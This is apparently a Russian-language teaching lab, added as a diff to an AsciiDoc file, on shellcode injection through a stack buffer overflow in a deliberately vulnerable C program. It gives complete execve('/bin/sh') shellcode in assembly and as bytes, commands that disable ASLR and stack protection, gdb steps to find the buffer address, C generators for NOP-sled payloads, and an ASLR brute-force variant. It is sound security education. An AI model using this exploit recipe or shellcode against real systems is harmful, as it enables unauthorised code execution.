@@ -1,0 +1,265 @@
+ifdef::env-github[]
+:tip-caption: :bulb:
+:note-caption: :memo:
+:important-caption: :heavy_exclamation_mark:
+:caution-caption: :fire:
+:warning-caption: :warning:
+endif::[]
+
+= Shellcode injection
+:source-highlighter: rouge
+:rouge-style: github
+:icons: font
+:sectnums:
+
+== Рассмотрим `vuln.c`
+
+[source, c]
+----
+#include <stdio.h>
+#include <string.h>
+
+void func(char *name) {
+        char buf[100];
+        strcpy(buf, name);
+        printf("Welcome %s\n", buf);
+}
+
+int main(int argc, char **argv) {
+        func(argv[1]);
+        return 0;
+}
+----
+
+В этом коде есть уязвимость: функция `strcpy` не указывает максимальную длину при копировании.
+Это может привести к записи данных за пределы `buf`, причём может быть перезаписан адрес возврата.
+
+== Скомпилируем код
+
+[source, shell]
+----
+gcc vuln.c -o vuln -fno-stack-protector -m32 -z execstack
+----
+
+Флаги:
+- `-fno-stack-protector` -- отключить проверки переполнений буфера на стеке (скорее всего по умолчанию компилятор проверок не вставляет, но может быть нужным для нестандартно-собранного компилятора);
+- `-m32` -- собрать 32-х битного окружения (делается для удобства, но может потребовать установки дополнительных пакетов, в целом можно обойтись без него, но получим длинные адреса);
+- `-z execstack` -- просим ринкер собрать исполняемый файл требующий исполняемый стек.
+
+== Отключаем https://en.wikipedia.org/wiki/Address_space_layout_randomization[ASLR]
+
+[source,shell]
+----
+echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space
+----
+
+== Посмотрим на ассемблерный код vuln
+
+[source, shell]
+----
+objdump -d -M intel vuln
+----
+
+Нас интересует строка `11b5:	8d 45 94	lea eax,[ebp-0x6c]`.
+`0x6c` это `108`, т.е `buf` начинается за `108` байтов от `ebp`.
+Ещё `4` байта отводится под хранение регистра `ebx` (строка `11a0:	53	push ebx`).
+Ещё `4` байта отводится под хранение регистра `ebp` -- указатель предыдущего кадра стека (строка `119d:	55	push ebp`).
+Следующие `4` байта хранят адрес возврата.
+
+== Рассмотрим `shellcode.nasm`
+
+[source, nasm]
+----
+xor     eax, eax    ;Clearing eax register
+push    eax         ;Pushing NULL bytes
+push    0x68732f2f  ;Pushing //sh
+push    0x6e69622f  ;Pushing /bin
+mov     ebx, esp    ;ebx now has address of /bin//sh
+push    eax         ;Pushing NULL byte
+mov     edx, esp    ;edx now has address of NULL byte
+push    ebx         ;Pushing address of /bin//sh
+mov     ecx, esp    ;ecx now has address of address
+                    ;of /bin//sh byte
+mov     al, 11      ;syscall number of execve is 11
+int     0x80        ;Make the system call
+----
+
+Данный ассемблерный код совершает системный вызов `execve`, запуская `/bin/sh`.
+
+== Скомпилируем код инъекции
+
+[source, shell]
+----
+nasm -f elf shellcode.asm
+----
+
+== Посмотрим на байты инъекции
+
+[source, shell]
+----
+objdump -d -M intel shellcode.o
+----
+
+Отсюда получаем последовательность байтов, содержащую инъекцию:
+`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`.
+
+== Куда делать инъекцию?
+
+Хотим сделать инъекцию через переполнение `buf`.
+Для этого будем передавать длинную строку  в первый аргумент `vuln`.
+Воспользуемся отладчиком `gdb`, чтобы определить, по какому адресу будет лежать `buf`.
+Т.к ASLR выключен, то адрес не будет меняться от запуска к запуску.
+
+== Запустим программу в отладчике
+
+[source]
+----
+gdb -q vuln
+(gdb) b func
+(gdb) r $(python -c 'print("A"*116)')
+(gdb) p $ebp - 0x6c
+----
+
+[IMPORTANT]
+====
+В отладчике мы запускали программу, передав ей один аргумент длины 116 байтов.
+Так как аргументы программы попадают в конец адрессного пространства, то для получения корректного адреса нужно,
+чтобы аргументы занимали столько же места, сколько займёт код инъекции.
+
+Попробуйте запустить программу с другим по длине аргументом и получите другой адрес.
+
+[source]
+----
+(gdb) r A
+(gdb) p $ebp - 0x6c
+----
+====
+
+В моём случае адрес возврата получился `0xffffce4c`.
+
+[NOTE]
+====
+В вашем случае адрес возврата может отличаться, поэтому в дальнейших шагах используйте его.
+====
+
+== Сформируем аргумент для `vuln`, который позволит запустить `sh`
+
+Сначала будут лежать байты кода, на который хотим выполнить возврат из функции `func`, а в конце -- адрес этого кода.
+Аргумент составим следующим образом: сначала идут 87 байтов  -- инструкция `NOP`,
+далее `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80` -- сама наша программа,
+далее `\x4c\xce\xff\xff` -- адрес возврата.
+
+Напишем и скомпилируем программу `injection_input.c`, которая будет печатать эти байты.
+
+[source, c]
+----
+#include <stdio.h>
+
+int main() {
+        for (int i = 0; i < 87; ++i) {
+                printf("\x90");
+        }
+        printf("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80");
+        printf("\x4c\xce\xff\xff");
+        return 0;
+}
+----
+
+Скомпилируем её.
+
+[source, shell]
+----
+gcc injection_input.c
+----
+
+== Запустим `vuln` передав ей сформированный вход
+
+[source, shell]
+----
+./vuln $(./a.out)
+----
+
+сИ видим, что запустился `sh`.
+
+[source]
+----
+Welcome 1Ph//shh/binPS
+                      L
+sh-5.1$
+----
+
+== Включим ASLR обратно
+
+[source,shell]
+----
+echo "2" | sudo dd of=/proc/sys/kernel/randomize_va_space
+----
+
+== Теперь попробуем произвести инъекцию с включённым ASLR
+
+Напишем и скомпилируем  программу `injection_code_aslr.c`, формирующую инъекцию.
+
+[source, c]
+----
+#include <stdio.h>
+
+int main() {
+        for (int i = 0; i < 100000; ++i) {
+                printf("\x90");
+        }
+        printf("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80");
+        return 0;
+}
+----
+
+[NOTE]
+====
+Заметим, что теперь инструкций `NOP` не `87`, а `100000`.
+====
+
+[source, c]
+----
+gcc injection_code_aslr.c
+----
+
+Запишем код нашей программы в переменную окружения `SHELLCODE`.
+
+[source, shell]
+----
+export SHELLCODE=$(./a.out)
+----
+
+Напишем и скомпилируем программу `injection_input_aslr.c` формирующую вход для `vuln`.
+
+[source, c]
+----
+#include <stdio.h>
+
+int main() {
+        for (int i = 0; i < 112; ++i) {
+                printf("A");
+        }
+        printf("\x11\x11\xff\xff");
+        return 0;
+}
+----
+
+[source, c]
+----
+gcc injection_input_aslr.c
+----
+
+== Запустим `vuln` передав ей сформированный вход
+
+[source, shell]
+----
+./vuln $(./a.out)
+----
+
+Повторяйте, пока не запустится `sh`.
+
+== Ссылки для самостоятельного изучения
+
+* https://dhavalkapil.com/blogs/Shellcode-Injection/[Оригинальная статья], по которой подготавливалось занятие.
+* https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/[Статья про атаку буфера]. Она попроще, но там разбираются многиеш вещи, которые разбирали на занятии.
+* https://habr.com/ru/companies/pt/articles/349544/[Классная статья про обход ASLR].
